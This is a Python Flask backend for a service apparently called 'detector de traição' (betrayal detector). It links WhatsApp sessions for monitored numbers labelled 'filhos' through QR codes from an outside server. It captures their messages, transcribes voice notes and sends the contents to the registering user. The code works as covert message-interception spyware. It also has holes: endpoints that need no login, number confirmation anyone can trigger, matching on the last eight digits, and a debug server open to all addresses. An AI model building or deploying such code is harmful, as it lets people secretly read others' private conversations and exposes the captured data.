from flask import Flask, render_template, request, redirect, url_for, session, abort, send_file, jsonify
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from werkzeug.security import generate_password_hash, check_password_hash
import psycopg2
from datetime import datetime, timedelta
import requests
import re
from openai import OpenAI
import tempfile
import os
from dotenv import load_dotenv

load_dotenv()
OPENAI_API_KEY = os.getenv("OPENAI_API_KEY")
DB_HOST = os.getenv("DB_HOST")
DB_NAME = os.getenv("DB_NAME")
DB_USER = os.getenv("DB_USER")
DB_PASS = os.getenv("DB_PASS")
DB_PORT = os.getenv("DB_PORT")
client = OpenAI(api_key=OPENAI_API_KEY)

app = Flask(__name__)
app.secret_key = os.getenv("FLASK_SECRET_KEY")
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = '/'

def get_db():
    return psycopg2.connect(
        host=DB_HOST, dbname=DB_NAME,
        user=DB_USER, password=DB_PASS,
        port=DB_PORT
    )

class User(UserMixin):
    def __init__(self, id, username, password_hash):
        self.id = id
        self.username = username
        self.password_hash = password_hash

@login_manager.user_loader
def load_user(user_id):
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT id, username, password FROM usuarios WHERE id = %s", (user_id,))
    row = cur.fetchone()
    conn.close()
    return User(*row) if row else None

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT id, username, password FROM usuarios WHERE username = %s", (username,))
        row = cur.fetchone()
        conn.close()
        if row and check_password_hash(row[2], password):
            user = User(*row)
            login_user(user)
            return redirect(url_for('painel'))
        return render_template('index.html', erro="Login inválido.")
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = generate_password_hash(request.form['password'])
        whatsapp_pai = request.form['whatsapp_pai'].strip()

        # Normalizar o número do whatsapp_pai
        numero = whatsapp_pai
        if numero.startswith('+55'):
            numero = numero[3:]
        elif numero.startswith('55'):
            numero = numero[2:]

        # Validar o número (deve ter 10 ou 11 dígitos após remover +55 ou 55)
        if not re.match(r'^\d{10,11}$', numero):
            return render_template('register.html', erro="Número de WhatsApp inválido. Use o formato com DDD (ex: 5512345678900 ou +5512345678900).")

        # Criar três variações do número
        ddd = numero[:2]
        resto = numero[2:]
        numero_com_9 = f"{ddd}9{resto}" if len(resto) == 8 else numero
        numero_sem_9 = f"{ddd}{resto[1:]}" if len(resto) == 9 and resto[0] == '9' else numero
        numero_original = numero

        # Adicionar +55 às variações
        numeros_para_confirmacao = [
            f"+55{numero_com_9}",
            f"+55{numero_sem_9}",
            f"+55{numero_original}"
        ]

        try:
            conn = get_db()
            cur = conn.cursor()
            # Inserir o usuário com o número original e confirmação pendente
            cur.execute("INSERT INTO usuarios (username, password, plano, whatsapp_pai, telefones_monitorados, confirmado) VALUES (%s, %s, %s, %s, %s, %s)",
                        (username, password, 'Gratuito', f"+55{numero_original}", [], False))
            conn.commit()
            conn.close()
        except psycopg2.IntegrityError:
            return render_template('register.html', erro="Usuário já existe.")

        # Enviar mensagens de confirmação para as três variações
        for num in set(numeros_para_confirmacao):
            try:
                confirmacao_url = f"https://detectordetraicao.digital/confirmar-numero/{num}"
                mensagem = f"Confirme seu número de WhatsApp clicando no link: {confirmacao_url}"
                response = requests.post("http://147.93.4.219:3000/enviar-confirmacao", json={
                    "numeros": [num],
                    "mensagem": mensagem
                }, timeout=10)
                response.raise_for_status()
                print(f"Mensagem de confirmação enviada para {num}: {response.text}")
            except Exception as e:
                print(f"Erro ao enviar mensagem de confirmação para {num}: {str(e)}")

        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/confirmar-numero/<numero>', methods=['GET'])
def confirmar_numero(numero):
    if not numero.startswith('+'):
        numero = f"+{numero}"
    if not re.match(r'^\+\d{12,13}$', numero):
        return jsonify({"erro": "Número inválido"}), 400

    try:
        conn = get_db()
        cur = conn.cursor()
        ultimos_8 = numero[-8:]
        cur.execute("SELECT id FROM usuarios WHERE RIGHT(whatsapp_pai, 8) = %s", (ultimos_8,))
        user = cur.fetchone()
        if user:
            user_id = user[0]
            cur.execute("UPDATE usuarios SET whatsapp_pai = %s, confirmado = %s WHERE id = %s", (numero, True, user_id))
            conn.commit()
            conn.close()
            return jsonify({"status": "Número confirmado com sucesso"})
        else:
            conn.close()
            return jsonify({"erro": "Usuário não encontrado"}), 404
    except Exception as e:
        return jsonify({"erro": f"Erro ao confirmar número: {str(e)}"}), 500

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route('/painel')
@login_required
def painel():
    conn = get_db()
    cur = conn.cursor()

    cur.execute("SELECT plano, telefones_monitorados, whatsapp_pai, confirmado FROM usuarios WHERE id = %s", (current_user.id,))
    row = cur.fetchone()
    conn.close()

    plano = row[0]
    filhos_raw = row[1] or []
    whatsapp_pai = row[2]
    confirmado = row[3]
    filhos = [{"id": idx + 1, "numero_whatsapp": numero} for idx, numero in enumerate(filhos_raw)]

    limites = {
        "Gratuito": 1,
        "Básico": 3,
        "Premium": 10
    }
    max_filhos = limites.get(plano, 1)

    mensagem_confirmacao = None
    if not confirmado:
        mensagem_confirmacao = "Por favor, clique no link enviado ao seu WhatsApp para confirmar seu número."

    qr_code = None
    return render_template(
        "painel.html",
        session_id=whatsapp_pai,
        plano=plano,
        filhos=filhos,
        max_filhos=max_filhos,
        qr_code=qr_code,
        mensagem_confirmacao=mensagem_confirmacao
    )

@app.route("/excluir-filho/<int:filho_id>", methods=["POST"])
@login_required
def excluir_filho(filho_id):
    conn = get_db()
    cur = conn.cursor()

    cur.execute("SELECT telefones_monitorados FROM usuarios WHERE id = %s", (current_user.id,))
    resultado = cur.fetchone()
    if not resultado:
        conn.close()
        return redirect(url_for("painel"))

    filhos = resultado[0] or []
    if filho_id <= len(filhos):
        numero_filho = filhos[filho_id - 1]
        if not numero_filho.startswith("+"):
            numero_filho = f"+{numero_filho}"
        del filhos[filho_id - 1]
        cur.execute("UPDATE usuarios SET telefones_monitorados = %s WHERE id = %s", (filhos, current_user.id))
        conn.commit()

        try:
            response = requests.post("http://147.93.4.219:3000/excluir-sessao", json={"numero": numero_filho}, timeout=10)
            response.raise_for_status()
            print(f"Sessão excluída para {numero_filho}: {response.text}")
        except Exception as e:
            print(f"Erro ao excluir sessão para {numero_filho}: {str(e)}")
            cur.execute("""
                INSERT INTO log_erros (usuario_id, erro, data)
                VALUES (%s, %s, %s)
            """, (current_user.id, f"Erro ao excluir sessão: {str(e)}", datetime.now()))
            conn.commit()

    conn.close()
    return redirect(url_for("painel"))

@app.route("/adicionar-filho", methods=["POST"])
@login_required
def adicionar_filho():
    numero = request.form["numero"].strip()
    if not numero.startswith("+"):
        numero = f"+{numero}"
    if not re.match(r"^\+\d{12,13}$", numero):
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT plano, telefones_monitorados FROM usuarios WHERE id = %s", (current_user.id,))
        resultado = cur.fetchone()
        plano = resultado[0]
        filhos = resultado[1] or []
        conn.close()
        return render_template(
            "painel.html",
            erro="Número inválido. Use o formato internacional (ex: +5512345678900).",
            session_id=current_user.username,
            plano=plano,
            filhos=[{"id": idx + 1, "numero_whatsapp": num} for idx, num in enumerate(filhos)],
            max_filhos=limites.get(plano, 1),
            qr_code=None
        )

    conn = get_db()
    cur = conn.cursor()

    cur.execute("SELECT plano, telefones_monitorados FROM usuarios WHERE id = %s", (current_user.id,))
    resultado = cur.fetchone()
    plano = resultado[0]
    filhos = resultado[1] or []

    limites = {
        "Gratuito": 1,
        "Básico": 3,
        "Premium": 10
    }
    max_filhos = limites.get(plano, 1)

    if len(filhos) >= max_filhos:
        conn.close()
        return render_template(
            "painel.html",
            erro="Limite de filhos atingido.",
            session_id=current_user.username,
            plano=plano,
            filhos=[{"id": idx + 1, "numero_whatsapp": num} for idx, num in enumerate(filhos)],
            max_filhos=max_filhos,
            qr_code=None
        )

    if numero in filhos:
        conn.close()
        return render_template(
            "painel.html",
            erro="Este número já está cadastrado.",
            session_id=current_user.username,
            plano=plano,
            filhos=[{"id": idx + 1, "numero_whatsapp": num} for idx, num in enumerate(filhos)],
            max_filhos=max_filhos,
            qr_code=None
        )

    filhos.append(numero)
    cur.execute("UPDATE usuarios SET telefones_monitorados = %s WHERE id = %s", (filhos, current_user.id))
    conn.commit()
    conn.close()

    try:
        response = requests.get(f"http://147.93.4.219:3000/qrcode/{numero}?force=true", timeout=10)
        response.raise_for_status()
        print(f"Solicitação de QR code enviada para {numero}: {response.text}")
    except Exception as e:
        print(f"Erro ao solicitar QR code para {numero}: {str(e)}")

    return redirect(url_for("painel"))

@app.route("/status-conexao", methods=["POST"])
@login_required
def status_conexao():
    try:
        numeros = request.json.get("numeros", [])
        status_resultados = {}

        for numero in numeros:
            if not numero.startswith("+"):
                numero = f"+{numero}"
            try:
                resp = requests.get(f"http://147.93.4.219:3000/status-sessao/{numero}", timeout=5)
                dados = resp.json()
                status_resultados[numero] = dados.get("conectado", False)
            except:
                status_resultados[numero] = False

        return jsonify(status_resultados)
    except Exception as e:
        return jsonify({"erro": str(e)}), 500

@app.route("/desconectar/<numero>", methods=["POST"])
@login_required
def desconectar(numero):
    if not numero.startswith("+"):
        numero = f"+{numero}"
    try:
        response = requests.post("http://147.93.4.219:3000/excluir-sessao", json={"numero": numero}, timeout=10)
        response.raise_for_status()
        return jsonify({"status": "sessão desconectada com sucesso"})
    except Exception as e:
        print(f"Erro ao desconectar sessão para {numero}: {str(e)}")
        return jsonify({"erro": f"erro ao desconectar sessão: {str(e)}"}), 500

@app.route("/mensagem-recebida", methods=["POST"])
def mensagem_recebida():
    if request.content_type.startswith("multipart/form-data"):
        numero_filho = '+' + request.form.get("para", "").strip('@s.whatsapp.net')
        numero_contato = '+' + request.form.get("de", "").strip('@s.whatsapp.net')
        horario_str = request.form.get("horario")
        tipo = request.form.get("tipo")
        nome_contato = request.form.get("nome_contato", "")

        if "audio" not in request.files:
            return jsonify({"erro": "arquivo de áudio não encontrado"}), 400

        audio_file = request.files["audio"]

        try:
            with tempfile.NamedTemporaryFile(delete=False, suffix=".ogg") as temp:
                audio_path = temp.name
                audio_file.save(audio_path)

            with open(audio_path, "rb") as f:
                transcription = client.audio.transcriptions.create(
                    model="whisper-1",
                    file=f,
                    response_format="text"
                )

            conteudo = transcription.strip()

        except Exception as e:
            return jsonify({"erro": f"falha ao transcrever áudio: {str(e)}"}), 500
        finally:
            if os.path.exists(audio_path):
                os.remove(audio_path)

    else:
        data = request.get_json()
        numero_filho = '+' + data.get("para").strip('@s.whatsapp.net')
        numero_contato = '+' + data.get("de").strip('@s.whatsapp.net')
        conteudo = data.get("texto")
        horario_str = data.get("horario")
        tipo = data.get("tipo")

    if not all([numero_filho, numero_contato, conteudo, horario_str]):
        return jsonify({"erro": "dados incompletos"}), 400

    try:
        horario = datetime.fromisoformat(horario_str.replace("Z", "+00:00"))
    except Exception as e:
        return jsonify({"erro": f"formato de horário inválido: {str(e)}"}), 400

    if tipo not in ["recebida", "enviada"]:
        return jsonify({"erro": "tipo inválido"}), 400

    if numero_contato == "+556792342051":
        return jsonify({"status": "mensagem ignorada (destinatário oficial)"})

    conn = get_db()
    cur = conn.cursor()

    if numero_filho != '+556792342051':
        cur.execute("""
            INSERT INTO mensagens_monitoradas (
                numero_filho, tipo, numero_contato, conteudo, horario
            ) VALUES (%s, %s, %s, %s, %s)
        """, (numero_filho, tipo, numero_contato, conteudo, horario))
        conn.commit()
        conn.close()

    return jsonify({"status": "mensagem salva com sucesso"})

@app.route("/disparar-relatorios", methods=["GET"])
def disparar_relatorios():
    conn = None
    try:
        conn = get_db()
        cur = conn.cursor()

        print("Consultando usuários no banco de dados...")
        cur.execute("SELECT id, whatsapp_pai, telefones_monitorados FROM usuarios WHERE whatsapp_pai IS NOT NULL")
        usuarios = cur.fetchall()
        print(f"Usuários encontrados: {usuarios}")

        for user_id, whatsapp_pai, telefones_monitorados in usuarios:
            print(f"Processando usuário {user_id}, whatsapp_pai: {whatsapp_pai}, telefones_monitorados: {telefones_monitorados}")
            if not telefones_monitorados:
                print(f"Sem telefones monitorados para usuário {user_id}")
                continue

            for numero_filho in telefones_monitorados:
                if not numero_filho.startswith("+"):
                    numero_filho = f"+{numero_filho}"
                ultimos_8 = numero_filho[-8:]
                print(f"Verificando mensagens para numero_filho: {numero_filho} (últimos 8: {ultimos_8})")
                cur.execute("""
                    SELECT conteudo, horario FROM mensagens_monitoradas
                    WHERE RIGHT(numero_filho, 8) = %s
                    ORDER BY horario DESC
                """, (ultimos_8,))
                mensagens = cur.fetchall()
                print(f"Mensagens para {numero_filho}: {mensagens} (count: {len(mensagens)})")

                if not mensagens:
                    print(f"Nenhuma mensagem encontrada para {numero_filho}, verificando dados brutos...")
                    cur.execute("SELECT * FROM mensagens_monitoradas WHERE RIGHT(numero_filho, 8) = %s", (ultimos_8,))
                    dados_brutos = cur.fetchall()
                    print(f"Dados brutos para {numero_filho}: {dados_brutos}")
                    continue

                corpo = f"Relatório de mensagens do número {numero_filho}:\n"
                for conteudo, horario in mensagens:
                    corpo += f"[{horario.strftime('%d/%m/%Y %H:%M')}] {conteudo}\n"
                print(f"Gerando relatório para {whatsapp_pai}: {corpo}")

                if not whatsapp_pai.startswith("+"):
                    whatsapp_pai = f"+{whatsapp_pai}"

                try:
                    print(f"Enviando relatório para {whatsapp_pai} com corpo: {corpo[:100]}...")
                    response = requests.post("http://147.93.4.219:3000/enviar-relatorio", json={
                        "numero_destino": whatsapp_pai,
                        "mensagem": corpo
                    }, timeout=10)
                    response.raise_for_status()
                    print(f"Relatório enviado para {whatsapp_pai} com status: {response.status_code} - {response.text}")
                    cur.execute("""
                        DELETE FROM mensagens_monitoradas
                        WHERE RIGHT(numero_filho, 8) = %s
                    """, (ultimos_8,))
                    conn.commit()
                except Exception as e:
                    print(f"Erro ao enviar relatório para {whatsapp_pai}: {str(e)}")
                    cur.execute("""
                        INSERT INTO log_erros (usuario_id, erro, data)
                        VALUES (%s, %s, %s)
                    """, (user_id, str(e), datetime.now()))
                    conn.commit()

        return jsonify({"status": "relatórios processados"})
    except Exception as e:
        print(f"Erro interno na rota /disparar-relatorios: {str(e)}")
        return jsonify({"erro": "Erro interno no servidor", "detalhes": str(e)}), 500
    finally:
        if conn:
            conn.close()

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
